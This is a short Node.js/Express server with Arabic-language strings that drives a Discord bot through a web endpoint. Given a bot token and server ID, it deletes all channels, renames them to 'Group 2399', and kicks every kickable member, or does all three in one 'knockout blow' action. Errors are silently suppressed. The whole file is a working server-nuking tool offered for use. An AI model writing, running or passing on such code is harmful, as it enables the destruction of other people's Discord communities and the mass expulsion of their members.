const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// تشغيل واجهة الموقع
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/execute', async (req, res) => {
    const { token, guildId, action } = req.body;
    const client = new Client({ 
        intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] 
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);

        if (action === 'حذف الرومات' || action === 'الضربة القاضية') {
            guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
        }
        if (action === 'تغيير الأسماء' || action === 'الضربة القاضية') {
            guild.channels.cache.forEach(channel => channel.setName('Group 2399').catch(() => {}));
        }
        if (action === 'طرد الجميع' || action === 'الضربة القاضية') {
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
        }

        res.send({ status: '✅ تم تنفيذ الأمر بنجاح يا لورد!' });
    } catch (error) {
        res.status(500).send({ status: '❌ خطأ: التوكن أو الآيدي غير صحيح!' });
    } finally {
        setTimeout(() => client.destroy(), 10000);
    }
});

app.listen(3000, () => console.log('المحرك جاهز!'));
